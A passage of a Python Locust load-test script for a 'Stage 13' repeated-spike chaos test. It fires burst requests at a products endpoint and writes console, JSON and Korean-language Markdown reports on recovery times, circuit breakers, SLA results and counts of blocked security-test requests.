                response.failure(f"Status: {response.status_code}")
            
            _record_request(True, elapsed_ms)
    
    @task(1)
    @tag("repeated", "malicious", "thundering")
    def thundering_herd_burst(self):
        """Thundering Herd pattern: simultaneous burst requests."""
        # Only trigger occasionally for maximum impact
        if random.random() > 0.1:  # 10% chance
            return
        
        _debug_log("🦬 Thundering Herd burst triggered!", "CHAOS")
        
        # Fire multiple requests in rapid succession
        for _ in range(5):
            with self.client.get(
                "/api/products/",
                name=f"{STAGE_NAME} ThunderHerd",
                catch_response=True,
            ) as response:
                if response.status_code == 200:
                    response.success()
                elif response.status_code == 429:
                    response.success()  # Rate limiting is expected
                    _debug_log("⚡ Rate limiter activated (expected)", "INFO")
                else:
                    response.failure(f"Status: {response.status_code}")


# =============================================================================
# Event Handlers
# =============================================================================

@events.test_start.add_listener
def on_test_start(environment, **kwargs):
    """Test start handler."""
    _debug_log("🏁 Stage 13 EXTREME Test Starting", "INFO")
    _debug_log(f"   Cycles: {NUM_CYCLES}", "INFO")
    _debug_log(f"   Cycle Duration: {CYCLE_DURATION}s", "INFO")
    _debug_log(f"   Max Users: {SPIKE_USERS}", "INFO")
    _debug_log(f"   Cool Users: {COOL_USERS}", "INFO")


@events.test_stop.add_listener
def on_test_stop(environment, **kwargs):
    """Generate comprehensive test report."""
    print("\n" + "=" * 80)
    print("📊 STAGE 13 EXTREME REPEATED SPIKE TEST REPORT")
    print("=" * 80)
    
    # Summary
    print("\n📋 Test Summary:")
    print(f"   Total Cycles: {len(_extreme_stats['cycles'])}")
    print(f"   Debug Mode: {DEBUG_MODE}")
    
    # Per-cycle analysis
    print("\n📈 Per-Cycle Analysis:")
    recovery_times = []
    
    for i, cycle in enumerate(_extreme_stats["cycles"]):
        print(f"\n  🔄 Cycle {i + 1}:")
        
        # Phase metrics
        for phase_name, phase_stats in cycle["phases"].items():
            if phase_stats["requests"] > 0:
                error_rate = phase_stats["errors"] / phase_stats["requests"] * 100
                response_times = phase_stats["response_times"]
                avg_response = sum(response_times) / len(response_times)
                p99 = sorted(response_times)[int(len(response_times) * 0.99)] if len(response_times) > 10 else max(response_times) if response_times else 0
                print(f"    {phase_name}: {phase_stats['requests']} reqs, {error_rate:.1f}% err, {avg_response:.0f}ms avg, {p99:.0f}ms p99")
        
        # Recovery time
        if cycle["recovery_time_seconds"]:
            recovery_times.append(cycle["recovery_time_seconds"])
            print(f"    Recovery: {cycle['recovery_time_seconds']:.1f}s")
        
        # Chaos injected
        if cycle["chaos_injected"]:
            print(f"    Chaos: {len(cycle['chaos_injected'])} injections")
    
    # Circuit Breaker analysis
    cb = _extreme_stats["circuit_breaker"]
    print("\n🔌 Circuit Breaker Statistics:")
    print(f"   Total Opens: {cb['total_opens']}")
    print(f"   Total Closes: {cb['total_closes']}")
    print(f"   Half-Opens: {cb['total_half_opens']}")
    print(f"   Affected Services: {list(cb['services_affected'])}")
    
    # Recovery consistency
    print("\n🔄 Recovery Consistency:")
    recovery = _extreme_stats["recovery"]
    if recovery_times:
        avg_recovery = sum(recovery_times) / len(recovery_times)
        max_recovery = max(recovery_times)
        min_recovery = min(recovery_times)
        
        print(f"   Average: {avg_recovery:.1f}s")
        print(f"   Min: {min_recovery:.1f}s")
        print(f"   Max: {max_recovery:.1f}s")
        print(f"   Variance: {max_recovery - min_recovery:.1f}s")
        
        recovery["per_cycle_latencies"] = recovery_times
        recovery["avg_recovery_latency_seconds"] = avg_recovery
        
        # Check for backoff accumulation
        if len(recovery_times) >= 2:
            if recovery_times[-1] > recovery_times[0] * 1.5:
                print("   ⚠️ WARNING: Recovery time INCREASED significantly")
                recovery["recovery_latency_trend"] = "increasing"
                cb["backoff_accumulation_detected"] = True
            elif recovery_times[-1] < recovery_times[0] * 0.7:
                print("   ✅ Recovery time DECREASED (good)")
                recovery["recovery_latency_trend"] = "decreasing"
            else:
                print("   ✅ Recovery time remained STABLE")
                recovery["recovery_latency_trend"] = "stable"
        
        # SLA check
        sla_breaches = sum(1 for t in recovery_times if t > 120)
        recovery["sla_breaches"] = sla_breaches
        if sla_breaches > 0:
            print(f"   ⚠️ SLA Breaches: {sla_breaches}/{len(recovery_times)} cycles > 2min")
        else:
            print("   ✅ All cycles under 2min SLA")
    
    # Emergency mode
    em = _extreme_stats["emergency"]
    print("\n🚨 Emergency Mode:")
    print(f"   Max Level: LEVEL_{em['max_level_reached']}")
    print(f"   Escalations: {len(em['escalations'])}")
    print(f"   Recovery Success: {em['recovery_successes']}")
    print(f"   Recovery Failures: {em['recovery_failures']}")
    
    # Chaos statistics
    chaos = _extreme_stats["chaos"]
    print("\n💥 Chaos Injection:")
    print(f"   Failures Injected: {chaos.get('failures_injected', 0)}")
    print(f"   Latency Injections: {chaos.get('latency_injections', 0)}")
    print(f"   Blast Radius Tests: {chaos.get('blast_radius_tests', 0)}")
    print(f"   Cascade Triggers: {chaos.get('cascade_triggers', 0)}")
    
    # DLQ
    dlq = _extreme_stats["dlq"]
    print("\n📬 DLQ Statistics:")
    print(f"   Max Pending: {dlq['max_pending']}")
    print(f"   Total Replayed: {dlq['total_replayed']}")
    
    # Throttle
    throttle = _extreme_stats["throttle"]
    print("\n⚡ Adaptive Throttle:")
    print(f"   Limit Adjustments: {throttle['limit_adjustments']}")
    if throttle["avg_rtt_ms"]:
        avg_rtt = sum(throttle["avg_rtt_ms"]) / len(throttle["avg_rtt_ms"])
        print(f"   Average RTT: {avg_rtt:.1f}ms")
    
    # Malicious Payload (리뷰 피드백 #2)
    malicious = _extreme_stats["malicious_payload"]
    print("\n🔐 Malicious Payload Tests (The Gauntlet):")
    print(f"   L1 SQL Injection: {malicious['l1_sql_injection_tests']} tests, {malicious['l1_blocked']} blocked")
    print(f"   L2 Signature Forgery: {malicious['l2_signature_forgery_tests']} tests, {malicious['l2_blocked']} blocked")
    print(f"   L3 Extreme Values: {malicious['l3_extreme_value_tests']} tests, {malicious['l3_blocked']} blocked")
    print(f"   Total: {malicious['total_tests']} tests, {malicious['total_blocked']} blocked")
    if malicious['bypass_detected']:
        print("   🚨 SECURITY ALERT: Bypass detected!")
    else:
        print("   ✅ No bypass detected")
    
    # Token Refresh (리뷰 피드백 #3)
    token = _extreme_stats["token_refresh"]
    print("\n🔑 Token Refresh:")
    print(f"   Refresh Count: {token['refresh_count']}")
    print(f"   Refresh Failures: {token['refresh_failures']}")
    
    # 🔥 V2.8 Aggressive Healing Statistics
    print("\n🔥 V2.8 Aggressive Healing:")
    aggressive_cb = _extreme_stats["aggressive_cb"]
    print(f"   XTest Errors → CB Count: {aggressive_cb['xtest_errors_counted']}")
    print(f"   Forced CB Opens (3회 실패): {aggressive_cb['forced_opens']}")
    print(f"   Quick Recoveries: {aggressive_cb['quick_recoveries']}")
    
    throttle = _extreme_stats["throttle"]
    print(f"   Rate Limit Aggressive Cuts: {throttle['aggressive_cuts']}")
    print(f"   Current Rate Limit: {throttle['current_limit_percent']:.0f}%")
    
    jitter = _extreme_stats["adaptive_jitter"]
    print(f"   Jitter Escalations: {jitter['escalations']}")
    print(f"   Current Jitter: {jitter['current_jitter_ms']:.0f}ms")
    print(f"   Max Jitter Reached: {'✅' if jitter['max_jitter_reached'] else '❌'}")
    
    # SLA verdict
    sla = _extreme_stats["sla"]
    print("\n⚖️ SLA Verdict:")
    print(f"   P99 Max: {sla['p99_max_ms']:.0f}ms (threshold: {SLA_P99_THRESHOLD_MS}ms)")
    if sla["p99_max_ms"] > SLA_P99_THRESHOLD_MS:
        sla["sla_passed"] = False
        print("   Status: ❌ FAILED")
    else:
        print("   Status: ✅ PASSED")
    
    # Save report
    _save_report(recovery_times)
    
    print("\n" + "=" * 80)


def _save_report(recovery_times: List[float]):
    """Save JSON and Markdown reports."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    date_str = datetime.now().strftime("%Y-%m-%d")
    
    # Create results directory
    results_dir = os.path.join(_load_tests_dir, "results", "stage13")
    os.makedirs(results_dir, exist_ok=True)
    
    # Prepare report data
    cb_services = list(_extreme_stats["circuit_breaker"]["services_affected"])
    
    report_data = {
        "test_name": "Stage 13: Repeated Spike EXTREME (Self-Healing Torture Test)",
        "timestamp": datetime.now().isoformat(),
        "test_config": {
            "num_cycles": NUM_CYCLES,
            "cycle_duration_s": CYCLE_DURATION,
            "spike_users": SPIKE_USERS,
            "cool_users": COOL_USERS,
            "debug_mode": DEBUG_MODE,
        },
        "cycles": [],
        "circuit_breaker": {
            "total_opens": _extreme_stats["circuit_breaker"]["total_opens"],
            "total_closes": _extreme_stats["circuit_breaker"]["total_closes"],
            "total_half_opens": _extreme_stats["circuit_breaker"]["total_half_opens"],
            "services_affected": cb_services,
            "backoff_accumulation_detected": _extreme_stats["circuit_breaker"]["backoff_accumulation_detected"],
        },
        "emergency": _extreme_stats["emergency"],
        "chaos": _extreme_stats["chaos"],
        "dlq": _extreme_stats["dlq"],
        "throttle": {
            "limit_adjustments": _extreme_stats["throttle"]["limit_adjustments"],
            "avg_rtt_ms": sum(_extreme_stats["throttle"]["avg_rtt_ms"]) / len(_extreme_stats["throttle"]["avg_rtt_ms"]) if _extreme_stats["throttle"]["avg_rtt_ms"] else None,
        },
        "corruption_shield": _extreme_stats["corruption_shield"],
        # 리뷰 피드백 #2: Malicious Payload 결과
        "malicious_payload": {
            "l1_sql_injection": {
                "tests": _extreme_stats["malicious_payload"]["l1_sql_injection_tests"],
                "blocked": _extreme_stats["malicious_payload"]["l1_blocked"],
            },
            "l2_signature_forgery": {
                "tests": _extreme_stats["malicious_payload"]["l2_signature_forgery_tests"],
                "blocked": _extreme_stats["malicious_payload"]["l2_blocked"],
            },
            "l3_extreme_values": {
                "tests": _extreme_stats["malicious_payload"]["l3_extreme_value_tests"],
                "blocked": _extreme_stats["malicious_payload"]["l3_blocked"],
            },
            "total_tests": _extreme_stats["malicious_payload"]["total_tests"],
            "total_blocked": _extreme_stats["malicious_payload"]["total_blocked"],
            "bypass_detected": _extreme_stats["malicious_payload"]["bypass_detected"],
        },
        # 리뷰 피드백 #3: Token Refresh 결과
        "token_refresh": {
            "refresh_count": _extreme_stats["token_refresh"]["refresh_count"],
            "refresh_failures": _extreme_stats["token_refresh"]["refresh_failures"],
        },
        # 🔥 V2.8 Aggressive Healing 결과
        "aggressive_healing": {
            "cb": {
                "xtest_errors_counted": _extreme_stats["aggressive_cb"]["xtest_errors_counted"],
                "forced_opens": _extreme_stats["aggressive_cb"]["forced_opens"],
                "quick_recoveries": _extreme_stats["aggressive_cb"]["quick_recoveries"],
            },
            "throttle": {
                "aggressive_cuts": _extreme_stats["throttle"]["aggressive_cuts"],
                "current_limit_percent": _extreme_stats["throttle"]["current_limit_percent"],
            },
            "jitter": {
                "escalations": _extreme_stats["adaptive_jitter"]["escalations"],
                "current_jitter_ms": _extreme_stats["adaptive_jitter"]["current_jitter_ms"],
                "max_reached": _extreme_stats["adaptive_jitter"]["max_jitter_reached"],
            },
            "sla_critical_ms": SLA_CRITICAL_MS,
            "sla_aggressive_threshold_ms": SLA_AGGRESSIVE_THRESHOLD_MS,
            "cb_failure_threshold": CB_FAILURE_THRESHOLD,
        },
        "recovery": {
            "times": recovery_times,
            "avg_seconds": sum(recovery_times) / len(recovery_times) if recovery_times else None,
            "trend": _extreme_stats["recovery"]["recovery_latency_trend"],
            "sla_breaches": _extreme_stats["recovery"]["sla_breaches"],
        },
        "sla": {
            "p99_max_ms": _extreme_stats["sla"]["p99_max_ms"],
            "threshold_ms": SLA_P99_THRESHOLD_MS,
            "passed": _extreme_stats["sla"]["sla_passed"],
        },
        "debug_logs_count": len(_extreme_stats["debug_logs"]),
    }
    
    # Per-cycle data
    for cycle in _extreme_stats["cycles"]:
        cycle_data = {
            "cycle_number": cycle["cycle_number"],
            "recovery_time_seconds": cycle["recovery_time_seconds"],
            "chaos_injected": len(cycle["chaos_injected"]),
            "phases": {},
        }
        for phase_name, phase_stats in cycle["phases"].items():
            if phase_stats["requests"] > 0:
                rts = phase_stats["response_times"]
                cycle_data["phases"][phase_name] = {
                    "requests": phase_stats["requests"],
                    "errors": phase_stats["errors"],
                    "error_rate": phase_stats["errors"] / phase_stats["requests"] * 100,
                    "avg_response_ms": sum(rts) / len(rts),
                    "p99_ms": sorted(rts)[int(len(rts) * 0.99)] if len(rts) > 10 else max(rts) if rts else 0,
                }
        report_data["cycles"].append(cycle_data)
    
    # Save JSON
    json_path = os.path.join(results_dir, f"stage13_extreme_{timestamp}.json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(report_data, f, indent=2, ensure_ascii=False)
    print(f"\n💾 JSON Report: {json_path}")
    
    # Save Markdown
    md_path = os.path.join(results_dir, f"stage13_extreme_{date_str}.md")
    _save_markdown_report(md_path, report_data, recovery_times)
    print(f"💾 Markdown Report: {md_path}")
    
    # Save debug logs if enabled
    if DEBUG_MODE and _extreme_stats["debug_logs"]:
        debug_path = os.path.join(results_dir, f"stage13_debug_{timestamp}.log")
        with open(debug_path, "w", encoding="utf-8") as f:
            f.write("\n".join(_extreme_stats["debug_logs"]))
        print(f"💾 Debug Log: {debug_path}")


def _save_markdown_report(path: str, data: dict, recovery_times: List[float]):
    """Save Markdown format report matching stage12 format."""
    
    # Determine grade
    sla_passed = data["sla"]["passed"]
    backoff_ok = not data["circuit_breaker"]["backoff_accumulation_detected"]
    recovery_ok = data["recovery"]["sla_breaches"] == 0
    
    if sla_passed and backoff_ok and recovery_ok:
        grade = "🏆 PLATINUM"
        grade_emoji = "💎"
    elif sla_passed and recovery_ok:
        grade = "🥇 GOLD"
        grade_emoji = "🏅"
    elif sla_passed:
        grade = "🥈 SILVER"
        grade_emoji = "🥈"
    else:
        grade = "🥉 BRONZE"
        grade_emoji = "🥉"
    
    md_content = f"""# Stage 13 EXTREME Repeated Spike 테스트 결과 보고서

📅 **테스트 일시**: {data['timestamp'][:19].replace('T', ' ')}
🏷️ **버전**: EXTREME Self-Healing V2.6 (Repeated Spike + Chaos)
🎯 **테스트 목표**: 반복적 스파이크에서 Backoff 누적 검증 및 Self-Healing 극한 테스트

---

## 🏆 Grade Status

| 항목 | 결과 | 기준 | 비고 |
|------|------|------|------|
| **SLA P99** | {'✅ PASS' if sla_passed else '❌ FAIL'} | ≤ {SLA_P99_THRESHOLD_MS}ms | 실제: {data['sla']['p99_max_ms']:.0f}ms |
| **Backoff 누적** | {'✅ 없음' if backoff_ok else '⚠️ 감지됨'} | 누적 없어야 함 | - |
| **복구 SLA** | {'✅ PASS' if recovery_ok else '❌ FAIL'} | 2분 이내 | 위반: {data['recovery']['sla_breaches']}회 |
| **🏆 최종 등급** | **{grade}** {grade_emoji} | - | - |

---

## 📋 Executive Summary

| 항목 | 값 | 상태 |
|------|-----|------|
| **EXTREME Mode** | ✅ 활성화 | - |
| **테스트 사이클** | {data['test_config']['num_cycles']} | - |
| **사이클당 시간** | {data['test_config']['cycle_duration_s']}s | - |
| **최대 사용자** | {data['test_config']['spike_users']} | - |
| **CB Open 횟수** | {data['circuit_breaker']['total_opens']} | {'🟢' if data['circuit_breaker']['total_opens'] < 5 else '🟡'} |
| **Emergency 최대 레벨** | LEVEL_{data['emergency']['max_level_reached']} | {'🟢' if data['emergency']['max_level_reached'] <= 1 else '🟡'} |

---

## 🔄 Repeated Spike 분석

### Per-Cycle Recovery Time

| 사이클 | 복구 시간 | 상태 |
|--------|----------|------|
"""

    for i, rt in enumerate(recovery_times):
        status = "🟢" if rt <= 60 else "🟡" if rt <= 120 else "🔴"
        md_content += f"| Cycle {i+1} | {rt:.1f}s | {status} |\n"
    
    if recovery_times:
        avg_rt = sum(recovery_times) / len(recovery_times)
        trend = data['recovery']['trend'] or "unknown"
        trend_emoji = "📈" if trend == "increasing" else "📉" if trend == "decreasing" else "➡️"
        
        md_content += f"""
### 복구 일관성 분석

| 항목 | 값 |
|------|-----|
| 평균 복구 시간 | {avg_rt:.1f}s |
| 최소 | {min(recovery_times):.1f}s |
| 최대 | {max(recovery_times):.1f}s |
| 편차 | {max(recovery_times) - min(recovery_times):.1f}s |
| 추세 | {trend_emoji} {trend} |
| **Backoff 누적 여부** | {'⚠️ 감지됨' if data['circuit_breaker']['backoff_accumulation_detected'] else '✅ 없음'} |
"""

    md_content += f"""
---

## 💥 Chaos Engineering 결과

| 항목 | 값 |
|------|-----|
| 장애 주입 횟수 | {data['chaos']['failures_injected']} |
| Latency 주입 | {data['chaos']['latency_injections']} |
| Blast Radius 테스트 | {data['chaos']['blast_radius_tests']} |
| 복구 트리거 | {data['chaos']['recovery_triggers']} |

---

## 🔌 Circuit Breaker

| 항목 | 값 |
|------|-----|
| Open 횟수 | {data['circuit_breaker']['total_opens']} |
| Close 횟수 | {data['circuit_breaker']['total_closes']} |
| Half-Open 횟수 | {data['circuit_breaker']['total_half_opens']} |
| 영향받은 서비스 | {', '.join(data['circuit_breaker']['services_affected']) or 'None'} |

---

## 🚨 Emergency Mode

| 항목 | 값 |
|------|-----|
| 최대 레벨 | LEVEL_{data['emergency']['max_level_reached']} |
| 에스컬레이션 횟수 | {len(data['emergency']['escalations'])} |
| 복구 성공 | {data['emergency']['recovery_successes']} |
| 복구 실패 | {data['emergency']['recovery_failures']} |

---

## 📬 DLQ & Throttle

### DLQ

| 항목 | 값 |
|------|-----|
| 최대 대기 | {data['dlq']['max_pending']} |
| 리플레이 처리 | {data['dlq']['total_replayed']} |

### Adaptive Throttle

| 항목 | 값 |
|------|-----|
| Limit 조정 횟수 | {data['throttle']['limit_adjustments']} |
| 평균 RTT | {data['throttle']['avg_rtt_ms'] or 0:.1f}ms |

---

## 🛡️ Corruption Shield

| 항목 | 값 |
|------|-----|
| 총 검증 | {data['corruption_shield']['validations']} |
| 차단됨 | {data['corruption_shield']['blocked']} |

---

## � Malicious Payload Tests (The Gauntlet)

| 레벨 | 테스트 유형 | 테스트 수 | 차단 수 | 차단율 |
|------|------------|----------|--------|--------|
| L1 | SQL Injection | {data['malicious_payload']['l1_sql_injection']['tests']} | {data['malicious_payload']['l1_sql_injection']['blocked']} | {(data['malicious_payload']['l1_sql_injection']['blocked'] / max(1, data['malicious_payload']['l1_sql_injection']['tests']) * 100):.1f}% |
| L2 | Signature Forgery | {data['malicious_payload']['l2_signature_forgery']['tests']} | {data['malicious_payload']['l2_signature_forgery']['blocked']} | {(data['malicious_payload']['l2_signature_forgery']['blocked'] / max(1, data['malicious_payload']['l2_signature_forgery']['tests']) * 100):.1f}% |
| L3 | Extreme Values | {data['malicious_payload']['l3_extreme_values']['tests']} | {data['malicious_payload']['l3_extreme_values']['blocked']} | {(data['malicious_payload']['l3_extreme_values']['blocked'] / max(1, data['malicious_payload']['l3_extreme_values']['tests']) * 100):.1f}% |
| **Total** | - | **{data['malicious_payload']['total_tests']}** | **{data['malicious_payload']['total_blocked']}** | **{(data['malicious_payload']['total_blocked'] / max(1, data['malicious_payload']['total_tests']) * 100):.1f}%** |

**보안 우회 탐지**: {'🚨 **감지됨** - 즉시 조치 필요!' if data['malicious_payload']['bypass_detected'] else '✅ 없음'}

---

## 🔑 Token Refresh (Auth Stability)

| 항목 | 값 |
|------|-----|
| 토큰 갱신 횟수 | {data['token_refresh']['refresh_count']} |
| 갱신 실패 | {data['token_refresh']['refresh_failures']} |
| 상태 | {'✅ 안정' if data['token_refresh']['refresh_failures'] == 0 else '⚠️ 불안정'} |

---

## �📊 Phase별 상세 메트릭

"""

    for cycle_data in data.get("cycles", []):
        md_content += f"\n### Cycle {cycle_data['cycle_number']}\n\n"
        md_content += "| Phase | Requests | Errors | Error Rate | Avg (ms) | P99 (ms) |\n"
        md_content += "|-------|----------|--------|------------|----------|----------|\n"
        
        for phase, metrics in cycle_data.get("phases", {}).items():
            md_content += f"| {phase} | {metrics['requests']} | {metrics['errors']} | {metrics['error_rate']:.1f}% | {metrics['avg_response_ms']:.0f} | {metrics['p99_ms']:.0f} |\n"

    md_content += """
---

## 🎯 결론

"""
    if grade == "🏆 PLATINUM":
        md_content += """- ✅ **PLATINUM 등급 달성**: 모든 SLA 충족, Backoff 누적 없음, 복구 시간 일관성 유지
- Self-Healing 시스템이 반복적인 극한 부하에서도 안정적으로 동작함을 확인
"""
    elif grade == "🥇 GOLD":
        md_content += """- ✅ **GOLD 등급**: SLA 충족, 복구 정상
- 일부 개선 필요 항목 존재
"""
    else:
        md_content += """- ⚠️ **개선 필요**: SLA 위반 또는 복구 지연 발생
- Backoff 튜닝 또는 시스템 최적화 검토 필요
"""

    md_content += f"""
---

*Generated at {data['timestamp']}*
"""

    with open(path, "w", encoding="utf-8") as f:
        f.write(md_content)
